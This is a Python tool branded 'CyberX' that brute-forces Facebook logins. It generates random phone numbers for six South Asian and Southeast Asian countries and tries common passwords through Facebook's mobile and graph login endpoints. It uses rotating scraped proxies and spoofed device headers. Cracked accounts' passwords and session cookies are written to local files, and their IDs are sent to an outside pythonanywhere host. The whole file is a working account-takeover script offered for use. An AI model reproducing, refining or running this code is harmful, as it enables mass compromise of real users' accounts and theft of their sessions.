#---------------------[ IMPORT ]---------------------#
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime
#---------------------[ LOOP ]---------------------#
id,user,poco,memek,loop,ok,cp=[],[],[],[],0,0,0
#---------------------[ PROXY ]---------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('Proxy.txt','w').write(prox)
except Exception as e:
	print(e)
#---------------------[ COLOUR ]---------------------#
G="\033[1;32m";W="\x1b[1;97m";R="\x1b[38;5;160m";B="\033[1;90m";Y="\033[1;33m";T="\033[1;34m";E="\x1b[38;5;205m";O="\x1b[38;5;81m";P="\033[1;35m";C="\033[1;36m"  #---------------------[ STYLE ]---------------------#
#---------------------[ STYLE ]---------------------#  
xd = f" {R}●{W}";xd1=f" {R}1{G}";xd2=f" {R}2{C}";xd3=f" {R}3{Y}";xd4=f" {R}4{T}";xd5=f" {R}5{E}";xd6=f" {R}6{O}";xd0=f" {R}0{P}";xdx=f" {R}?{B}"  
#---------------------[ CLEAR ]---------------------#
def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear') 
    print(logo)

def linex():print(f"{W}{47*'-'}")
#---------------------[ LOGO ]---------------------#
logo = f'''  
{R}   _______     {P}______  {C}______ {Y}_____     {E}__   __  
{R}  / ____{T}\\ \\   / {P}/  _ \\{C}|  ____|{Y}  __ \\    {E}\\ \\ / /  
{R} | |     {T}\\ \\_/ /{P}| |_) |{C} |__  {Y}| |__) |{W}____{E}\\ V /   
{R} | |     {T} \\   / {P}|  _ <{C}|  __| {Y}|  _  /{W}______{E}> <    
{R} | |____  {T} | |  {P}| |_) |{C} |____{Y}| | \\ \\     {E}/ . \\   
{R}  \\_____| {T} |_|  {P}|____/{C}|______{Y}|_|  \\_\\   {E}/_/ \\_\\  
{W}{47*'-'}  
{R} Owner   {W}: {G}Rohit X Reduan {W}| {E}CyberVenom X CyberGhost
{R} Status  {W}: {Y}VVIP.
{R} Version {W}: {C}BETA TEST
{W}{47*'-'}  
    \x1b[47m\x1b[31m            WELCOME TO THE WORLD OF DARKNESS       \x1b[0m  
{W}{47*'-'}  
'''
#---------------------[ MAIN MENU ]---------------------#
def cyberx():
	clear();print(f'{xd1} BANGLADESHI RANDOM CLONING ');print(f'{xd2} INDIAN RANDOM CLONING  ');print(f'{xd3} PAKISTANI RANDOM CLONING  ');print(f'{xd4} NEPALI RANDOM CLONING  ');print(f'{xd5} AFGHANISTANI RANDOM CLONING  ');print(f'{xd6} MALAYSIAN RANDOM CLONING  ');print(f'{xd0} EXIT. ');linex();___option___ = input(f'{xdx} CHOOSE AN OPTION {G}:{Y} ')
	if ___option___ in ["1"]:poco.append('1');______randomxmenu_______()
	elif ___option___ in ["2"]:poco.append('2');______randomxmenu_______()
	elif ___option___ in ["3"]:poco.append('3');______randomxmenu_______()
	elif ___option___ in ["4"]:poco.append('4');______randomxmenu_______()
	elif ___option___ in ["5"]:poco.append('5');______randomxmenu_______()
	elif ___option___ in ["6"]:poco.append('6');______randomxmenu_______()
	elif ___option___ in ["0"]:exit()
	else:linex();print(f'{xd} INVALID CHOICE ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);cyberx()
#---------------------[ RANDOM BD/INDIA/PAKISTAN/NEPAL/AFGHANISTAN/MALAYSIA MENU ]---------------------#
def ______randomxmenu_______():
	clear()
	if "1" in poco:print(f"{xd} EXAMPLE {R}:{G} 013 {R}|{O} 016 {R}|{T} 017 {R}|{C} 018 {R}|{E} 019 ");linex()
	if "2" in poco:print(f"{xd} EXAMPLE {R}:{G} +91639 {R}|{O} +91600 {R}|{T} +91620 ");linex()
	if "3" in poco:print(f"{xd} EXAMPLE {R}:{G} 0306 {R}|{O} 0315 {R}|{T} 0335 {R}|{C} 0345 ");linex()
	if "4" in poco:print(f"{xd} EXAMPLE {R}:{G} 9814 {R}|{O} 9815 {R}|{T} 9861 {R}|{C} 9840 ");linex()
	if "5" in poco:print(f"{xd} EXAMPLE {R}:{G} +9340 {R}|{O} +9360 {R}|{T} +9330 {R}|{C} +9350 ");linex()
	if "6" in poco:print(f"{xd} EXAMPLE {R}:{W} 0113 {R}|{W} 0116 {R}|{W} 0112 {R}|{W} 0119 ");linex()
	code = input(f'{xdx} ENTER CARRIER CODE {R}:{G} ');linex();print(f"{xd} EXAMPLE {R}:{O} 6969 {R}|{T} 5555 {R}|{C} 7777 {R}|{E} 99999 ");linex();limit=int(input(f'{xdx} ENTER CRACK LIMIT {R}:{W} '))
	clear();print(f"{xd1} METHOD M1 {R}|{Y}HOST{R}| ");print(f"{xd2} METHOD M2 {R}|{Y}GRAPH{R}| ");linex();___method___=input(f'{xdx} ENTER METHOD {R}:{Y} ')
	for nmbr in range(int(limit)):
		if "1" in poco:gang = ''.join(random.choice(string.digits) for _ in range(8));user.append(gang)
		if "2" in poco:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
		if "3" in poco:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
		if "4" in poco:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
		if "5" in poco:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
		if "6" in poco:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
	with ThreadPool(max_workers=30) as ____poco____:
		clear();tl = str(len(user))
		print(f'{xd} CODE{R}|{Y}UID {R}:{G} {code}{R}|{G}{tl} ');print(f"{xd} IF NO RESULT {G}ON{Y}|{R}OFF{W} AIRPLANE MODE");print(f'{xd} YOUR CLONING STARTED{W}.{R}.{G}.{R}.{G}.{R}.{G}.{R}.{G}.{R}!!');linex()
		for love in user:
			ids = code + love 
			if "1" in poco:pasx=[ids,love,ids[:6],"BANGLADESH","708090","168375","405060","ILoveyou","S@Dia123","mim143","123456","@@@@####","@#@#@#@#","১২৩৪৫৬৭৮","১২৩৪৫৬","Password"]
			if "2" in poco:pasx=[ids,love,ids[:6],"57273200","57575751","59039200"]
			if "3" in poco:pasx=[ids,love,ids[5:],'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
			if "4" in poco:pasx=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
			if "5" in poco:pasx=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
			if "6" in poco:pasx=[ids,love,love[1:],ids[:7],ids[:6],ids[:8]]
			if ___method___ in ['1']:____poco____.submit(____methodA____,ids,pasx,tl)
			elif ___method___ in ['2']:____poco____.submit(____methodB____,ids,pasx,tl)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{R}|{W}CP {R}:{G}  '+str(len(ok))+f'{R}|{G}'+str(len(cp)));linex();exit()

#---------------------[ user agent ]---------------------#

def _cyberx_():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    model=random.choice(["SM-P550","SM-X808U","SM-A155M","SM-G556B","SM-X818U","2201116SG","24090RA29G","23090RA98G","24117RN76O","M2101K6G","CPH2683","PHQ110","PEPM00","2311FRAFDC","24090RA29G","24117RN76G","24117RN76O","RMX3868 ","RMX5051 ","RMX3996 ","RMX3938 ","RMX3709 ","RMX3709 ","I2126 ","CLA5","LH6n ","LH6n ","CL7 ","CL9  ","LH6n ","CPH2689"," 23116PN5BC","PHM110","CPH2651","V2166BA","V2337","RMX3933","RMX2201"]) 
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''

#---------------------[ RANDOM METHOD A ]---------------------#
def ____methodA____(ids,pasx,tl):
	global loop,ok,cp
	ewe = requests.Session()
	ua = f'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
	sys.stdout.write(f'\r\r{xd} CyberX-M1 {loop}{R}|{G}{ok}{R}|{Y}{cp} ');sys.stdout.flush()
	for pw in pasx:
		try:
			xx = open('Proxy.txt','r').read().splitlines()
			zz = {'http': 'socks4://'+random.choice(xx)}
			link = ewe.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
				"try_number": 0,
				"unrecognized_tries": 0,
				"email": ids,
				"prefill_contact_point": ids,
				"prefill_source": "browser_dropdown",
				"prefill_type": "contact_point",
				"first_prefill_source": "browser_dropdown",
				"first_prefill_type": "contact_point",
				"had_cp_prefilled": True,
				"had_password_prefilled": False,
				"is_smart_lock": False,
				"bi_xrwh": 0,
				"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
				"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
				}
			headers = {
				"Host": "touch.facebook.com",
				"content-length": str(len((data))),
				"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
				"sec-ch-ua-mobile": "?1",
				"user-agent": _cyberx_(),
				"x-response-format": "JSONStream",
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
				"viewport-width": "360",
				"x-requested-with": "XMLHttpRequest",
				"x-asbd-id": "129477",
				"dpr": "2",
				"sec-ch-prefers-color-scheme": "light",
				"sec-ch-ua-platform": '"Android"',
				"accept": "*/*",
				"origin": "https://touch.facebook.com",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
			response = ewe.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,
				headers = headers,
				allow_redirects = False,
				proxies = zz
				)
			if "checkpoint" in ewe.cookies.get_dict():
				uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				print(f"\r{xd}{Y} CyberX-CP {uid} | {pw} ")
				open('/sdcard/CyberX-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				uid = re.findall('c_user=(.*);xs', kuki)[0]
				response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
				if 'LIVE' in response:
					print(f"\r{xd}{G} CyberX-OK {uid} | {pw} ")
					print(f"\r{xd} \U0001F4A5{W} {kuki} ");print(f"{W}{47*'-'}")
					open('/sdcard/CyberX-M1-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				else:continue
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
#---------------------[ RANDOM METHOD B ]---------------------#
def ____methodB____(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r\r{xd} CyberX-M2 {loop}{R}|{G}{ok}{R}|{Y}{cp} ');sys.stdout.flush()
        try:
                for pw in pasx:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        __R2X__ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {"adid": adid,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pw,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={'User-Agent': __R2X__,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': '45204','X-FB-SIM-HNI': '45201','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '698'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        uid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                                        if 'LIVE' in response:
                                            print(f"\r{xd}{G} CyberX-OK {uid} | {pw} ")
                                            print(f"\r{xd} \U0001F4A5{W} {coki} ");print(f"{W}{47*'-'}")
                                            open('/sdcard/CyberX-M2-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
                                            ok.append(str(uid))
                                            break
                                        else:continue
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        print(f"\r{xd}{Y} CyberX-CP {uid} | {pw} ")
                                        open('/sdcard/CyberX-M2-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                                        cp.append(str(uid))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------[ END CODE ]---------------------#
if __name__=='__main__':
	cyberx()